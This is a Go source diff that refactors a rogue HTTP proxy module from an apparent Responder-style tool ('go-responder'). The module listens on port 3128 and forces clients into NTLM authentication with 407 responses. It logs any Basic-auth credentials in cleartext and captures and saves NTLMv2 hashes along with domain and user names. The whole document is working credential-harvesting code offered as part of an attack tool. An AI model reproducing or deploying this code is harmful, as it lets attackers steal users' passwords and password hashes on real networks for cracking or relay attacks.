@@ -1,4 +1,4 @@
-package main
+package server
 
 import (
 	"bufio"
@@ -7,36 +7,35 @@ import (
 	"net"
 	"strings"
 	"time"
+
+	"go-responder/internal/core"
 )
 
-// serveProxy listens on port 3128 and captures NTLMv2 from Proxy-Authorization headers.
-// Browsers and HTTP clients that use a proxy will send NTLM auth via 407 negotiation.
-func serveProxy(ifaceIP net.IP) {
+func ServeProxy(ifaceIP net.IP) {
 	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:3128", ifaceIP))
 	if err != nil {
-		logError("Proxy listen :3128 — %v (need root?)", err)
+		core.LogError("Proxy listen :3128 — %v (need root?)", err)
 		return
 	}
-	logInfo("Proxy listening on %s:3128 (HTTP NTLM proxy)", ifaceIP)
+	core.LogInfo("Proxy listening on %s:3128 (HTTP NTLM proxy)", ifaceIP)
 	for {
 		c, err := ln.Accept()
 		if err != nil {
 			continue
 		}
-		go handleProxy(c)
+		go HandleProxy(c)
 	}
 }
 
-func handleProxy(c net.Conn) {
+func HandleProxy(c net.Conn) {
 	defer c.Close()
 	c.SetDeadline(time.Now().Add(30 * time.Second))
 
-	challenge := getChallenge()
+	challenge := core.GetChallenge()
 	r := bufio.NewReader(c)
 	challengeIssued := false
 
 	for {
-		// Read the request line
 		requestLine, err := r.ReadString('\n')
 		if err != nil {
 			return
@@ -47,7 +46,6 @@ func handleProxy(c net.Conn) {
 			continue
 		}
 
-		// Read and index headers
 		headers := make(map[string]string)
 		for {
 			line, err := r.ReadString('\n')
@@ -69,61 +67,58 @@ func handleProxy(c net.Conn) {
 		proxyAuth := headers["proxy-authorization"]
 
 		if proxyAuth == "" || strings.ToUpper(proxyAuth) == "NTLM" {
-			// No auth or bare NTLM keyword — send 407 requesting NTLM
-			logVerbose("Proxy connection from %s — requesting NTLM auth", c.RemoteAddr())
+			core.LogVerbose("Proxy connection from %s — requesting NTLM auth", c.RemoteAddr())
 			sendProxyResponse(c, 407, "NTLM", nil)
 			continue
 		}
 
 		if !strings.HasPrefix(strings.ToUpper(proxyAuth), "NTLM ") {
-			// Non-NTLM auth (e.g. Basic) — capture cleartext and reject
 			parts := strings.SplitN(proxyAuth, " ", 2)
 			if len(parts) == 2 {
 				decoded, err := base64.StdEncoding.DecodeString(parts[1])
 				if err == nil {
-					logSuccess("[Proxy] Cleartext auth from %s: %s", c.RemoteAddr(), string(decoded))
+					core.LogSuccess("[Proxy] Cleartext auth from %s: %s", c.RemoteAddr(), string(decoded))
 				}
 			}
 			sendProxyResponse(c, 407, "NTLM", nil)
 			return
 		}
 
-		// Parse NTLM token
 		raw, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(proxyAuth[5:], " "))
 		if err != nil {
 			sendProxyResponse(c, 407, "NTLM", nil)
 			return
 		}
 
-		ntlm := FindNTLMSSP(raw)
+		ntlm := core.FindNTLMSSP(raw)
 		if len(ntlm) < 12 {
 			sendProxyResponse(c, 407, "NTLM", nil)
 			return
 		}
 
-		switch ntlmMsgType(ntlm) {
-		case 1: // NTLM negotiate — issue challenge
+		switch core.NTLMMsgType(ntlm) {
+		case 1:
 			challengeIssued = true
-			ntlmChal := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
+			ntlmChal := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
 			encoded := base64.StdEncoding.EncodeToString(ntlmChal)
-			logVerbose("Proxy NTLM Type1 from %s — issuing challenge", c.RemoteAddr())
+			core.LogVerbose("Proxy NTLM Type1 from %s — issuing challenge", c.RemoteAddr())
 			sendProxyResponse(c, 407, "NTLM "+encoded, nil)
 
-		case 3: // NTLM authenticate — capture hash
+		case 3:
 			if !challengeIssued {
 				sendProxyResponse(c, 407, "NTLM", nil)
 				return
 			}
-			hash, user, domain, err := ParseNTLMAuthenticate(ntlm, challenge)
+			hash, user, domain, err := core.ParseNTLMAuthenticate(ntlm, challenge)
 			if err != nil {
-				logVerbose("Proxy NTLM parse: %v", err)
+				core.LogVerbose("Proxy NTLM parse: %v", err)
 				sendProxyResponse(c, 407, "NTLM", nil)
 				return
 			}
-			logSuccess("[Proxy] NTLMv2 captured from %s", c.RemoteAddr())
-			logSuccess("        %s\\%s", domain, user)
-			logSuccess("        %s", hash)
-			saveHash(hash)
+			core.LogSuccess("[Proxy] NTLMv2 captured from %s", c.RemoteAddr())
+			core.LogSuccess("        %s\\%s", domain, user)
+			core.LogSuccess("        %s", hash)
+			core.SaveHash(hash)
 			sendProxyResponse(c, 407, "NTLM", nil)
 			return
 
